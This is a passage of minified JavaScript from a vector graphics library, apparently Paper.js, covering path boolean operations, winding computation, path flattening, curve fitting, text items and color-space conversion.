                                b._time = (b._time - m) / (1 - m);
                            }
                        }
                        v._setSegment(g);
                        var S = g._intersection,
                            C = v._intersection;
                        if (S) {
                            c(S, C);
                            for (var T = S; T; ) c(T._intersection, S), (T = T._next);
                        } else g._intersection = C;
                    }
                }
                return i || d(l), o || t;
            }
            function g(e, s, r, o, a) {
                var l,
                    h,
                    u = r ? 1 : 0,
                    c = 1 ^ u,
                    d = [e.x, e.y],
                    f = d[u],
                    p = d[c],
                    v = 1e-6,
                    m = f - 1e-9,
                    _ = f + 1e-9,
                    y = 0,
                    w = 0,
                    x = 0,
                    b = 0,
                    S = !1,
                    C = !1,
                    T = 1,
                    k = [];
                function I(n) {
                    var h = n[c + 0],
                        d = n[c + 6];
                    if (!(p < t(h, d) || p > i(h, d))) {
                        var y = n[u + 0],
                            w = n[u + 2],
                            C = n[u + 4],
                            I = n[u + 6];
                        if (h !== d) {
                            var O = p === h ? 0 : p === d ? 1 : m > i(y, w, C, I) || _ < t(y, w, C, I) ? 1 : M.solveCubic(n, c, p, k, 0, 1) > 0 ? k[0] : 1,
                                P = 0 === O ? y : 1 === O ? I : M.getPoint(n, O)[r ? "y" : "x"],
                                z = h > d ? 1 : -1,
                                A = l[c] > l[c + 6] ? 1 : -1,
                                E = l[u + 6];
                            return (
                                p !== h
                                    ? (P < m ? (x += z) : P > _ ? (b += z) : (S = !0), P > f - v && P < f + v && (T /= 2))
                                    : (z !== A ? (y < m ? (x += z) : y > _ && (b += z)) : y != E && (E < _ && P > _ ? ((b += z), (S = !0)) : E > m && P < m && ((x += z), (S = !0))), (T = 0)),
                                (l = n),
                                !a && P > m && P < _ && 0 === M.getTangent(n, O)[r ? "x" : "y"] && g(e, s, !r, o, !0)
                            );
                        }
                        ((y < _ && I > m) || (I < _ && y > m)) && (S = !0);
                    }
                }
                function O(e) {
                    var n = e[c + 0],
                        s = e[c + 2],
                        o = e[c + 4],
                        a = e[c + 6];
                    if (p <= i(n, s, o, a) && p >= t(n, s, o, a))
                        for (var l, h = e[u + 0], d = e[u + 2], f = e[u + 4], g = e[u + 6], v = m > i(h, d, f, g) || _ < t(h, d, f, g) ? [e] : M.getMonoCurves(e, r), y = 0, w = v.length; y < w; y++) if ((l = I(v[y]))) return l;
                }
                for (var P = 0, z = s.length; P < z; P++) {
                    var A,
                        E = s[P],
                        L = E._path,
                        $ = E.getValues();
                    if (!((P && s[P - 1]._path === L) || ((l = null), L._closed || ((h = M.getValues(L.getLastCurve().getSegment2(), E.getSegment1(), null, !o))[c] !== h[c + 6] && (l = h)), l))) {
                        l = $;
                        for (var j = L.getLastCurve(); j && j !== E; ) {
                            var D = j.getValues();
                            if (D[c] !== D[c + 6]) {
                                l = D;
                                break;
                            }
                            j = j.getPrevious();
                        }
                    }
                    if ((A = O($))) return A;
                    if (P + 1 === z || s[P + 1]._path !== L) {
                        if (h && (A = O(h))) return A;
                        !S || x || b || (x = b = L.isClockwise(o) ^ r ? 1 : -1), (y += x), (w += b), (x = b = 0), S && ((C = !0), (S = !1)), (h = null);
                    }
                }
                return (y = n(y)), (w = n(w)), { winding: i(y, w), windingL: y, windingR: w, quality: T, onPath: C };
            }
            function v(t, e, i, s, r) {
                var o = [],
                    a = t,
                    l = 0;
                do {
                    var u = (y = t.getCurve()).getLength();
                    o.push({ segment: t, curve: y, length: u }), (l += u), (t = t.getNext());
                } while (t && !t._intersection && t !== a);
                for (var c = [0.5, 0.25, 0.75], d = { winding: 0, quality: -1 }, f = 0; f < c.length && d.quality < 0.5; f++) {
                    u = l * c[f];
                    for (var p = 0, v = o.length; p < v; p++) {
                        var m = o[p],
                            _ = m.length;
                        if (u <= _) {
                            var y,
                                w = (y = m.curve)._path,
                                x = w._parent,
                                b = x instanceof L ? x : w,
                                S = h.clamp(y.getTimeAt(u), 1e-8, 1 - 1e-8),
                                C = y.getPointAtTime(S),
                                T = n(y.getTangentAtTime(S).y) < Math.SQRT1_2,
                                k = null;
                            if (r.subtract && i) {
                                var I = b === e ? i._getWinding(C, T, !0) : e._getWinding(C, T, !0);
                                if ((b === e && I.winding) || (b === i && !I.winding)) {
                                    if (I.quality < 1) continue;
                                    k = { winding: 0, quality: 1 };
                                }
                            }
                            (k = k || g(C, s, T, !0)).quality > d.quality && (d = k);
                            break;
                        }
                        u -= _;
                    }
                }
                for (p = o.length - 1; p >= 0; p--) o[p].segment._winding = d;
            }
            function m(t, e) {
                var i,
                    n = [];
                function s(t) {
                    var i;
                    return !(!t || t._visited || (e && (!e[(i = t._winding || {}).winding] || (e.unite && 2 === i.winding && i.windingL && i.windingR))));
                }
                function r(t) {
                    if (t) for (var e = 0, n = i.length; e < n; e++) if (t === i[e]) return !0;
                    return !1;
                }
                function o(t) {
                    for (var e = t._segments, i = 0, n = e.length; i < n; i++) e[i]._visited = !0;
                }
                function a(t, e) {
                    var n = t._intersection,
                        o = n,
                        a = [];
                    function l(n, o) {
                        for (; n && n !== o; ) {
                            var l = n._segment,
                                h = l && l._path;
                            if (h) {
                                var u = l.getNext() || h.getFirstSegment(),
                                    c = u._intersection;
                                l !== t && (r(l) || r(u) || (u && s(l) && (s(u) || (c && s(c._segment))))) && a.push(l), e && i.push(l);
                            }
                            n = n._next;
                        }
                    }
                    if ((e && (i = [t]), n)) {
                        for (l(n); n && n._prev; ) n = n._prev;
                        l(n, o);
                    }
                    return a;
                }
                t.sort(function (t, e) {
                    var i = t._intersection,
                        n = e._intersection,
                        s = !(!i || !i._overlap),
                        r = !(!n || !n._overlap),
                        o = t._path,
                        a = e._path;
                    return s ^ r ? (s ? 1 : -1) : !i ^ !n ? (i ? 1 : -1) : o !== a ? o._id - a._id : t._index - e._index;
                });
                for (var l = 0, h = t.length; l < h; l++) {
                    var u,
                        c,
                        d,
                        f = t[l],
                        p = s(f),
                        g = null,
                        v = !1,
                        m = !0,
                        _ = [];
                    if (p && f._path._overlapsOnly) {
                        var y = f._path,
                            x = f._intersection._segment._path;
                        y.compare(x) && (y.getArea() && n.push(y.clone(!1)), o(y), o(x), (p = !1));
                    }
                    for (; p; ) {
                        var b = !g,
                            S = a(f, b),
                            C = S.shift(),
                            T = !(v = !b && (r(f) || r(C))) && C;
                        if ((b && ((g = new E(w.NO_INSERT)), (u = null)), v)) {
                            (f.isFirst() || f.isLast()) && (m = f._path._closed), (f._visited = !0);
                            break;
                        }
                        if ((T && u && (_.push(u), (u = null)), u || (T && S.push(f), (u = { start: g._segments.length, crossings: S, visited: (c = []), handleIn: d })), T && (f = C), !s(f))) {
                            g.removeSegments(u.start);
                            for (var k = 0, I = c.length; k < I; k++) c[k]._visited = !1;
                            for (c.length = 0; ((f = u && u.crossings.shift()) && f._path) || ((f = null), (u = _.pop()) && ((c = u.visited), (d = u.handleIn))), u && !s(f); );
                            if (!f) break;
                        }
                        var P = f.getNext();
                        g.add(new O(f._point, d, P && f._handleOut)), (f._visited = !0), c.push(f), (f = P || f._path.getFirstSegment()), (d = P && P._handleIn);
                    }
                    v && (m && (g.getFirstSegment().setHandleIn(d), g.setClosed(m)), 0 !== g.getArea() && n.push(g));
                }
                return n;
            }
            return {
                _getWinding: function (t, e, i) {
                    return g(t, this.getCurves(), e, i);
                },
                unite: function (t, e) {
                    return l(this, t, "unite", e);
                },
                intersect: function (t, e) {
                    return l(this, t, "intersect", e);
                },
                subtract: function (t, e) {
                    return l(this, t, "subtract", e);
                },
                exclude: function (t, e) {
                    return l(this, t, "exclude", e);
                },
                divide: function (t, e) {
                    return e && (0 == e.trace || e.stroke) ? u(this, t, "divide") : a([this.subtract(t, e), this.intersect(t, e)], !0, this, t, e);
                },
                resolveCrossings: function () {
                    var t = this._children,
                        e = t || [this];
                    function i(t, e) {
                        var i = t && t._intersection;
                        return i && i._overlap && i._path === e;
                    }
                    var n = !1,
                        r = !1,
                        o = this.getIntersections(null, function (t) {
                            return (t.hasOverlap() && (n = !0)) || (t.isCrossing() && (r = !0));
                        }),
                        a = n && r && [];
                    if (((o = z.expand(o)), n))
                        for (
                            var l = p(
                                    o,
                                    function (t) {
                                        return t.hasOverlap();
                                    },
                                    a
                                ),
                                h = l.length - 1;
                            h >= 0;
                            h--
                        ) {
                            var u = l[h],
                                c = u._path,
                                f = u._segment,
                                g = f.getPrevious(),
                                v = f.getNext();
                            i(g, c) && i(v, c) && (f.remove(), g._handleOut._set(0, 0), v._handleIn._set(0, 0), g === f || g.getCurve().hasLength() || (v._handleIn.set(g._handleIn), g.remove()));
                        }
                    r &&
                        (p(
                            o,
                            n &&
                                function (t) {
                                    var e = t.getCurve(),
                                        i = t.getSegment(),
                                        n = t._intersection,
                                        s = n._curve,
                                        r = n._segment;
                                    if (e && s && e._path && s._path) return !0;
                                    i && (i._intersection = null), r && (r._intersection = null);
                                },
                            a
                        ),
                        a && d(a),
                        (e = m(
                            s.each(
                                e,
                                function (t) {
                                    s.push(this, t._segments);
                                },
                                []
                            )
                        )));
                    var _,
                        y = e.length;
                    return (
                        y > 1 && t ? (e !== t && this.setChildren(e), (_ = this)) : 1 !== y || t || (e[0] !== this && this.setSegments(e[0].removeSegments()), (_ = this)),
                        _ || ((_ = new L(w.NO_INSERT)).addChildren(e), (_ = _.reduce()).copyAttributes(this), this.replaceWith(_)),
                        _
                    );
                },
                reorient: function (t, i) {
                    var n = this._children;
                    return (
                        n && n.length
                            ? this.setChildren(
                                  f(
                                      this.removeChildren(),
                                      function (e) {
                                          return !!(t ? e : 1 & e);
                                      },
                                      i
                                  )
                              )
                            : i !== e && this.setClockwise(i),
                        this
                    );
                },
                getInteriorPoint: function () {
                    var e = this.getBounds().getCenter(!0);
                    if (!this.contains(e)) {
                        for (var n = this.getCurves(), s = e.y, r = [], o = [], a = 0, l = n.length; a < l; a++) {
                            var h = n[a].getValues(),
                                u = h[1],
                                c = h[3],
                                d = h[5],
                                f = h[7];
                            if (s >= t(u, c, d, f) && s <= i(u, c, d, f))
                                for (var p = M.getMonoCurves(h), g = 0, v = p.length; g < v; g++) {
                                    var m = p[g],
                                        _ = m[1],
                                        y = m[7];
                                    if (_ !== y && ((s >= _ && s <= y) || (s >= y && s <= _))) {
                                        var w = s === _ ? m[0] : s === y ? m[6] : 1 === M.solveCubic(m, 1, s, o, 0, 1) ? M.getPoint(m, o[0]).x : (m[0] + m[6]) / 2;
                                        r.push(w);
                                    }
                                }
                        }
                        r.length > 1 &&
                            (r.sort(function (t, e) {
                                return t - e;
                            }),
                            (e.x = (r[0] + r[1]) / 2));
                    }
                    return e;
                },
            };
        })()
    );
    var $ = s.extend(
            {
                _class: "PathFlattener",
                initialize: function (t, e, i, n, s) {
                    var r,
                        o = [],
                        a = [],
                        l = 0,
                        h = 1 / (i || 32),
                        u = t._segments,
                        c = u[0];
                    function d(t, i) {
                        var r = M.getValues(t, i, s);
                        o.push(r),
                            (function t(i, s, r, o) {
                                if (!(o - r > h) || (n && M.isStraight(i)) || M.isFlatEnough(i, e || 0.25)) {
                                    var u = i[6] - i[0],
                                        c = i[7] - i[1],
                                        d = Math.sqrt(u * u + c * c);
                                    d > 0 && ((l += d), a.push({ offset: l, curve: i, index: s, time: o }));
                                } else {
                                    var f = M.subdivide(i, 0.5),
                                        p = (r + o) / 2;
                                    t(f[0], s, r, p), t(f[1], s, p, o);
                                }
                            })(r, t._index, 0, 1);
                    }
                    for (var f = 1, p = u.length; f < p; f++) d(c, (r = u[f])), (c = r);
                    t._closed && d(r || c, u[0]), (this.curves = o), (this.parts = a), (this.length = l), (this.index = 0);
                },
                _get: function (t) {
                    for (var e, i = this.parts, n = i.length, s = this.index; (e = s), s && !(i[--s].offset < t); );
                    for (; e < n; e++) {
                        var r = i[e];
                        if (r.offset >= t) {
                            this.index = e;
                            var o = i[e - 1],
                                a = o && o.index === r.index ? o.time : 0,
                                l = o ? o.offset : 0;
                            return { index: r.index, time: a + ((r.time - a) * (t - l)) / (r.offset - l) };
                        }
                    }
                    return { index: i[n - 1].index, time: 1 };
                },
                drawPart: function (t, e, i) {
                    for (var n = this._get(e), s = this._get(i), r = n.index, o = s.index; r <= o; r++) {
                        var a = M.getPart(this.curves[r], r === n.index ? n.time : 0, r === s.index ? s.time : 1);
                        r === n.index && t.moveTo(a[0], a[1]), t.bezierCurveTo.apply(t, a.slice(2));
                    }
                },
            },
            s.each(
                M._evaluateMethods,
                function (t) {
                    this[t + "At"] = function (e) {
                        var i = this._get(e);
                        return M[t](this.curves[i.index], i.time);
                    };
                },
                {}
            )
        ),
        j = s.extend({
            initialize: function (t) {
                for (var e, i = (this.points = []), n = t._segments, s = t._closed, r = 0, o = n.length; r < o; r++) {
                    var a = n[r].point;
                    (e && e.equals(a)) || i.push((e = a.clone()));
                }
                s && (i.unshift(i[i.length - 1]), i.push(i[1])), (this.closed = s);
            },
            fit: function (t) {
                var e = this.points,
                    i = e.length,
                    n = null;
                return i > 0 && ((n = [new O(e[0])]), i > 1 && (this.fitCubic(n, t, 0, i - 1, e[1].subtract(e[0]), e[i - 2].subtract(e[i - 1])), this.closed && (n.shift(), n.pop()))), n;
            },
            fitCubic: function (t, e, i, n, s, r) {
                var o = this.points;
                if (n - i != 1) {
                    for (var a, l = this.chordLengthParameterize(i, n), h = Math.max(e, e * e), u = !0, c = 0; c <= 4; c++) {
                        var d = this.generateBezier(i, n, l, s, r),
                            f = this.findMaxError(i, n, d, l);
                        if (f.error < e && u) return void this.addCurve(t, d);
                        if (((a = f.index), f.error >= h)) break;
                        (u = this.reparameterize(i, n, l, d)), (h = f.error);
                    }
                    var p = o[a - 1].subtract(o[a + 1]);
                    this.fitCubic(t, e, i, a, s, p), this.fitCubic(t, e, a, n, p.negate(), r);
                } else {
                    var g = o[i],
                        v = o[n],
                        m = g.getDistance(v) / 3;
                    this.addCurve(t, [g, g.add(s.normalize(m)), v.add(r.normalize(m)), v]);
                }
            },
            addCurve: function (t, e) {
                t[t.length - 1].setHandleOut(e[1].subtract(e[0])), t.push(new O(e[3], e[2].subtract(e[3])));
            },
            generateBezier: function (t, e, i, n, s) {
                for (
                    var r = Math.abs,
                        o = this.points,
                        a = o[t],
                        l = o[e],
                        h = [
                            [0, 0],
                            [0, 0],
                        ],
                        u = [0, 0],
                        c = 0,
                        d = e - t + 1;
                    c < d;
                    c++
                ) {
                    var f = i[c],
                        p = 1 - f,
                        g = 3 * f * p,
                        v = p * p * p,
                        m = g * p,
                        _ = g * f,
                        y = f * f * f,
                        w = n.normalize(m),
                        x = s.normalize(_),
                        b = o[t + c].subtract(a.multiply(v + m)).subtract(l.multiply(_ + y));
                    (h[0][0] += w.dot(w)), (h[0][1] += w.dot(x)), (h[1][0] = h[0][1]), (h[1][1] += x.dot(x)), (u[0] += w.dot(b)), (u[1] += x.dot(b));
                }
                var S,
                    C,
                    T = h[0][0] * h[1][1] - h[1][0] * h[0][1];
                if (r(T) > 1e-12) {
                    var k = h[0][0] * u[1] - h[1][0] * u[0];
                    (S = (u[0] * h[1][1] - u[1] * h[0][1]) / T), (C = k / T);
                } else {
                    var I = h[0][0] + h[0][1],
                        O = h[1][0] + h[1][1];
                    S = C = r(I) > 1e-12 ? u[0] / I : r(O) > 1e-12 ? u[1] / O : 0;
                }
                var P,
                    M,
                    z = l.getDistance(a),
                    A = 1e-12 * z;
                if (S < A || C < A) S = C = z / 3;
                else {
                    var E = l.subtract(a);
                    (P = n.normalize(S)), (M = s.normalize(C)), P.dot(E) - M.dot(E) > z * z && ((S = C = z / 3), (P = M = null));
                }
                return [a, a.add(P || n.normalize(S)), l.add(M || s.normalize(C)), l];
            },
            reparameterize: function (t, e, i, n) {
                for (var s = t; s <= e; s++) i[s - t] = this.findRoot(n, this.points[s], i[s - t]);
                s = 1;
                for (var r = i.length; s < r; s++) if (i[s] <= i[s - 1]) return !1;
                return !0;
            },
            findRoot: function (t, e, i) {
                for (var n = [], s = [], r = 0; r <= 2; r++) n[r] = t[r + 1].subtract(t[r]).multiply(3);
                for (r = 0; r <= 1; r++) s[r] = n[r + 1].subtract(n[r]).multiply(2);
                var o = this.evaluate(3, t, i),
                    a = this.evaluate(2, n, i),
                    l = this.evaluate(1, s, i),
                    u = o.subtract(e),
                    c = a.dot(a) + u.dot(l);
                return h.isZero(c) ? i : i - u.dot(a) / c;
            },
            evaluate: function (t, e, i) {
                for (var n = e.slice(), s = 1; s <= t; s++) for (var r = 0; r <= t - s; r++) n[r] = n[r].multiply(1 - i).add(n[r + 1].multiply(i));
                return n[0];
            },
            chordLengthParameterize: function (t, e) {
                for (var i = [0], n = t + 1; n <= e; n++) i[n - t] = i[n - t - 1] + this.points[n].getDistance(this.points[n - 1]);
                n = 1;
                for (var s = e - t; n <= s; n++) i[n] /= i[s];
                return i;
            },
            findMaxError: function (t, e, i, n) {
                for (var s = Math.floor((e - t + 1) / 2), r = 0, o = t + 1; o < e; o++) {
                    var a = this.evaluate(3, i, n[o - t]).subtract(this.points[o]),
                        l = a.x * a.x + a.y * a.y;
                    l >= r && ((r = l), (s = o));
                }
                return { error: r, index: s };
            },
        }),
        D = w.extend({
            _class: "TextItem",
            _applyMatrix: !1,
            _canApplyMatrix: !1,
            _serializeFields: { content: null },
            _boundsOptions: { stroke: !1, handle: !1 },
            initialize: function (t) {
                (this._content = ""), (this._lines = []);
                var i = t && s.isPlainObject(t) && t.x === e && t.y === e;
                this._initialize(i && t, !i && c.read(arguments));
            },
            _equals: function (t) {
                return this._content === t._content;
            },
            copyContent: function (t) {
                this.setContent(t._content);
            },
            getContent: function () {
                return this._content;
            },
            setContent: function (t) {
                (this._content = "" + t), (this._lines = this._content.split(/\r\n|\n|\r/gm)), this._changed(521);
            },
            isEmpty: function () {
                return !this._content;
            },
            getCharacterStyle: "#getStyle",
            setCharacterStyle: "#setStyle",
            getParagraphStyle: "#getStyle",
            setParagraphStyle: "#setStyle",
        }),
        N = D.extend({
            _class: "PointText",
            initialize: function () {
                D.apply(this, arguments);
            },
            getPoint: function () {
                var t = this._matrix.getTranslation();
                return new d(t.x, t.y, this, "setPoint");
            },
            setPoint: function () {
                var t = c.read(arguments);
                this.translate(t.subtract(this._matrix.getTranslation()));
            },
            _draw: function (t, e, i) {
                if (this._content) {
                    this._setStyles(t, e, i);
                    var n = this._lines,
                        s = this._style,
                        r = s.hasFill(),
                        o = s.hasStroke(),
                        a = s.getLeading(),
                        l = t.shadowColor;
                    (t.font = s.getFontStyle()), (t.textAlign = s.getJustification());
                    for (var h = 0, u = n.length; h < u; h++) {
                        t.shadowColor = l;
                        var c = n[h];
                        r && (t.fillText(c, 0, 0), (t.shadowColor = "rgba(0,0,0,0)")), o && t.strokeText(c, 0, 0), t.translate(0, a);
                    }
                }
            },
            _getBounds: function (t, e) {
                var i = this._style,
                    n = this._lines,
                    s = n.length,
                    r = i.getJustification(),
                    o = i.getLeading(),
                    a = this.getView().getTextWidth(i.getFontStyle(), n),
                    l = 0;
                "left" !== r && (l -= a / ("center" === r ? 2 : 1));
                var h = new g(l, s ? -0.75 * o : 0, a, s * o);
                return t ? t._transformBounds(h, h) : h;
            },
        }),
        F = s.extend(
            new (function () {
                var t,
                    e = { gray: ["gray"], rgb: ["red", "green", "blue"], hsb: ["hue", "saturation", "brightness"], hsl: ["hue", "saturation", "lightness"], gradient: ["gradient", "origin", "destination", "highlight"] },
                    n = {},
                    r = { transparent: [0, 0, 0, 0] };
                var o = [
                        [0, 3, 1],
                        [2, 0, 1],
                        [1, 0, 3],
                        [1, 2, 0],
                        [3, 1, 0],
                        [0, 1, 2],
                    ],
                    a = {
                        "rgb-hsb": function (t, e, i) {
                            var n = Math.max(t, e, i),
                                s = n - Math.min(t, e, i);
                            return [0 === s ? 0 : 60 * (n == t ? (e - i) / s + (e < i ? 6 : 0) : n == e ? (i - t) / s + 2 : (t - e) / s + 4), 0 === n ? 0 : s / n, n];
                        },
                        "hsb-rgb": function (t, e, i) {
                            var n,
                                s = (t = (((t / 60) % 6) + 6) % 6) - (n = Math.floor(t)),
                                r = [i, i * (1 - e), i * (1 - e * s), i * (1 - e * (1 - s))];
                            return [r[(n = o[n])[0]], r[n[1]], r[n[2]]];
                        },
                        "rgb-hsl": function (t, e, i) {
                            var n = Math.max(t, e, i),
                                s = Math.min(t, e, i),
                                r = n - s,
                                o = 0 === r,
                                a = (n + s) / 2;
                            return [o ? 0 : 60 * (n == t ? (e - i) / r + (e < i ? 6 : 0) : n == e ? (i - t) / r + 2 : (t - e) / r + 4), o ? 0 : a < 0.5 ? r / (n + s) : r / (2 - n - s), a];
                        },
                        "hsl-rgb": function (t, e, i) {
                            if (0 === e) return [i, i, i];
                            for (var n = [(t = (((t / 360) % 1) + 1) % 1) + 1 / 3, t, t - 1 / 3], s = i < 0.5 ? i * (1 + e) : i + e - i * e, r = 2 * i - s, o = [], a = 0; a < 3; a++) {
                                var l = n[a];
                                l < 0 && (l += 1), l > 1 && (l -= 1), (o[a] = 6 * l < 1 ? r + 6 * (s - r) * l : 2 * l < 1 ? s : 3 * l < 2 ? r + (s - r) * (2 / 3 - l) * 6 : r);
                            }
                            return o;
                        },
                        "rgb-gray": function (t, e, i) {
                            return [0.2989 * t + 0.587 * e + 0.114 * i];
                        },
                        "gray-rgb": function (t) {
                            return [t, t, t];
                        },
                        "gray-hsb": function (t) {
                            return [0, 0, t];
                        },
                        "gray-hsl": function (t) {
                            return [0, 0, t];
                        },
                        "gradient-rgb": function () {
                            return [];
                        },
                        "rgb-gradient": function () {
                            return [];
                        },
                    };
                return s.each(
                    e,
                    function (t, i) {
                        (n[i] = []),
                            s.each(
                                t,
                                function (t, r) {
                                    var o = s.capitalize(t),
                                        a = /^(hue|saturation)$/.test(t),
                                        l = (n[i][r] =
                                            "gradient" === i
                                                ? "gradient" === t
                                                    ? function (t) {
                                                          var e = this._components[0];
                                                          return e !== (t = B.read(Array.isArray(t) ? t : arguments, 0, { readNull: !0 })) && (e && e._removeOwner(this), t && t._addOwner(this)), t;
                                                      }
                                                    : function () {
                                                          return c.read(arguments, 0, { readNull: "highlight" === t, clone: !0 });
                                                      }
                                                : function (t) {
                                                      return null == t || isNaN(t) ? 0 : +t;
                                                  });
                                    (this["get" + o] = function () {
                                        return this._type === i || (a && /^hs[bl]$/.test(this._type)) ? this._components[r] : this._convert(i)[r];
                                    }),
                                        (this["set" + o] = function (t) {
                                            this._type === i || (a && /^hs[bl]$/.test(this._type)) || ((this._components = this._convert(i)), (this._properties = e[i]), (this._type = i)),
                                                (this._components[r] = l.call(this, t)),
                                                this._changed();
                                        });
                                },
                                this
                            );
                    },
                    {
                        _class: "Color",
                        _readIndex: !0,
                        initialize: function o(a) {
                            var l,
                                h,
                                u,
                                c,
                                d = arguments,
                                f = this.__read,
                                p = 0;
                            Array.isArray(a) && (a = (d = a)[0]);
                            var g = null != a && typeof a;
                            if (("string" === g && a in e && ((l = a), (a = d[1]), Array.isArray(a) ? ((h = a), (u = d[2])) : (f && (p = 1), (d = s.slice(d, 1)), (g = typeof a))), !h)) {
                                if ((c = "number" === g ? d : "object" === g && null != a.length ? a : null)) {
                                    l || (l = c.length >= 3 ? "rgb" : "gray");
                                    var v = e[l].length;
                                    (u = c[v]), f && (p += c === arguments ? v + (null != u ? 1 : 0) : 1), c.length > v && (c = s.slice(c, 0, v));
                                } else if ("string" === g) {
                                    var m = (function (e) {
                                        var n,
                                            s = e.match(/^#([\da-f]{2})([\da-f]{2})([\da-f]{2})([\da-f]{2})?$/i) || e.match(/^#([\da-f])([\da-f])([\da-f])([\da-f])?$/i),
                                            o = "rgb";
                                        if (s) {
                                            var a = s[4] ? 4 : 3;
                                            n = new Array(a);
                                            for (var l = 0; l < a; l++) {
                                                var h = s[l + 1];
                                                n[l] = parseInt(1 == h.length ? h + h : h, 16) / 255;
                                            }
                                        } else if ((s = e.match(/^(rgb|hsl)a?\((.*)\)$/))) {
                                            (o = s[1]), (n = s[2].trim().split(/[,\s]+/g));
                                            for (var u = "hsl" === o, c = ((l = 0), Math.min(n.length, 4)); l < c; l++) {
                                                var d = n[l];
                                                if (((h = parseFloat(d)), u))
                                                    if (0 === l) {
                                                        var f = d.match(/([a-z]*)$/)[1];
                                                        h *= { turn: 360, rad: 180 / Math.PI, grad: 0.9 }[f] || 1;
                                                    } else l < 3 && (h /= 100);
                                                else l < 3 && (h /= 255);
                                                n[l] = h;
                                            }
                                        } else {
                                            var p = r[e];
                                            if (!p)
                                                if (i) {
                                                    t || ((t = tt.getContext(1, 1)).globalCompositeOperation = "copy"), (t.fillStyle = "rgba(0,0,0,0)"), (t.fillStyle = e), t.fillRect(0, 0, 1, 1);
                                                    var g = t.getImageData(0, 0, 1, 1).data;
                                                    p = r[e] = [g[0] / 255, g[1] / 255, g[2] / 255];
                                                } else p = [0, 0, 0];
                                            n = p.slice();
                                        }
                                        return [o, n];
                                    })(a);
                                    (l = m[0]), 4 === (h = m[1]).length && ((u = h[3]), h.length--);
                                } else if ("object" === g)
                                    if (a.constructor === o) {
                                        if (((l = a._type), (h = a._components.slice()), (u = a._alpha), "gradient" === l))
                                            for (var _ = 1, y = h.length; _ < y; _++) {
                                                var w = h[_];
                                                w && (h[_] = w.clone());
                                            }
                                    } else if (a.constructor === B) (l = "gradient"), (c = d);
                                    else {
                                        var x = e[(l = "hue" in a ? ("lightness" in a ? "hsl" : "hsb") : "gradient" in a || "stops" in a || "radial" in a ? "gradient" : "gray" in a ? "gray" : "rgb")],
                                            b = n[l];
                                        this._components = h = [];
                                        for (_ = 0, y = x.length; _ < y; _++) {
                                            null == (S = a[x[_]]) && !_ && "gradient" === l && "stops" in a && (S = { stops: a.stops, radial: a.radial }), null != (S = b[_].call(this, S)) && (h[_] = S);
                                        }
                                        u = a.alpha;
                                    }
                                f && l && (p = 1);
                            }
                            if (((this._type = l || "rgb"), !h)) {
                                this._components = h = [];
                                for (_ = 0, y = (b = n[this._type]).length; _ < y; _++) {
                                    var S;
                                    null != (S = b[_].call(this, c && c[_])) && (h[_] = S);
                                }
                            }
                            return (this._components = h), (this._properties = e[this._type]), (this._alpha = u), f && (this.__read = p), this;
                        },
                        set: "#initialize",
                        _serialize: function (t, e) {
                            var i = this.getComponents();
                            return s.serialize(/^(gray|rgb)$/.test(this._type) ? i : [this._type].concat(i), t, !0, e);
                        },
                        _changed: function () {
                            (this._canvasStyle = null), this._owner && this._owner._changed(129);
                        },
                        _convert: function (t) {
                            var e;
                            return this._type === t ? this._components.slice() : (e = a[this._type + "-" + t]) ? e.apply(this, this._components) : a["rgb-" + t].apply(this, a[this._type + "-rgb"].apply(this, this._components));
                        },
                        convert: function (t) {
                            return new F(t, this._convert(t), this._alpha);
                        },
                        getType: function () {
                            return this._type;
                        },
                        setType: function (t) {
                            (this._components = this._convert(t)), (this._properties = e[t]), (this._type = t);
                        },
                        getComponents: function () {
                            var t = this._components.slice();
                            return null != this._alpha && t.push(this._alpha), t;
                        },
                        getAlpha: function () {
                            return null != this._alpha ? this._alpha : 1;
                        },
                        setAlpha: function (t) {
                            (this._alpha = null == t ? null : Math.min(Math.max(t, 0), 1)), this._changed();
                        },
                        hasAlpha: function () {
                            return null != this._alpha;
                        },
                        equals: function (t) {
                            var e = s.isPlainValue(t, !0) ? F.read(arguments) : t;
                            return e === this || (e && this._class === e._class && this._type === e._type && this.getAlpha() === e.getAlpha() && s.equals(this._components, e._components)) || !1;
                        },
                        toString: function () {
                            for (var t = this._properties, e = [], i = "gradient" === this._type, n = l.instance, s = 0, r = t.length; s < r; s++) {
                                var o = this._components[s];
                                null != o && e.push(t[s] + ": " + (i ? o : n.number(o)));
                            }
                            return null != this._alpha && e.push("alpha: " + n.number(this._alpha)), "{ " + e.join(", ") + " }";
                        },
                        toCSS: function (t) {
                            var e = this._convert("rgb"),
                                i = t || null == this._alpha ? 1 : this._alpha;
                            function n(t) {
                                return Math.round(255 * (t < 0 ? 0 : t > 1 ? 1 : t));
                            }
                            return (e = [n(e[0]), n(e[1]), n(e[2])]), i < 1 && e.push(i < 0 ? 0 : i), t ? "#" + ((1 << 24) + (e[0] << 16) + (e[1] << 8) + e[2]).toString(16).slice(1) : (4 == e.length ? "rgba(" : "rgb(") + e.join(",") + ")";
                        },
                        toCanvasStyle: function (t, e) {
                            if (this._canvasStyle) return this._canvasStyle;
                            if ("gradient" !== this._type) return (this._canvasStyle = this.toCSS());
                            var i,
                                n = this._components,
                                s = n[0],
                                r = s._stops,
                                o = n[1],
                                a = n[2],
                                l = n[3],
                                h = e && e.inverted();
                            if ((h && ((o = h._transformPoint(o)), (a = h._transformPoint(a)), l && (l = h._transformPoint(l))), s._radial)) {
                                var u = a.getDistance(o);
                                if (l) {
                                    var c = l.subtract(o);
                                    c.getLength() > u && (l = o.add(c.normalize(u - 0.1)));
                                }
                                var d = l || o;
                                i = t.createRadialGradient(d.x, d.y, 0, o.x, o.y, u);
                            } else i = t.createLinearGradient(o.x, o.y, a.x, a.y);
                            for (var f = 0, p = r.length; f < p; f++) {
                                var g = r[f],
                                    v = g._offset;
                                i.addColorStop(null == v ? f / (p - 1) : v, g._color.toCanvasStyle());
                            }
                            return (this._canvasStyle = i);
                        },
                        transform: function (t) {
                            if ("gradient" === this._type) {
                                for (var e = this._components, i = 1, n = e.length; i < n; i++) {
                                    var s = e[i];
                                    t._transformPoint(s, s, !0);
                                }
                                this._changed();
                            }
                        },
                        statics: {
                            _types: e,
                            random: function () {
                                var t = Math.random;
                                return new F(t(), t(), t());
                            },
                        },
                    }
                );
            })(),
            new (function () {
                return s.each(
                    {
                        add: function (t, e) {
                            return t + e;
                        },
                        subtract: function (t, e) {
                            return t - e;
                        },
                        multiply: function (t, e) {
                            return t * e;
                        },
                        divide: function (t, e) {
                            return t / e;
                        },
                    },
                    function (t, e) {
                        this[e] = function (e) {
                            e = F.read(arguments);
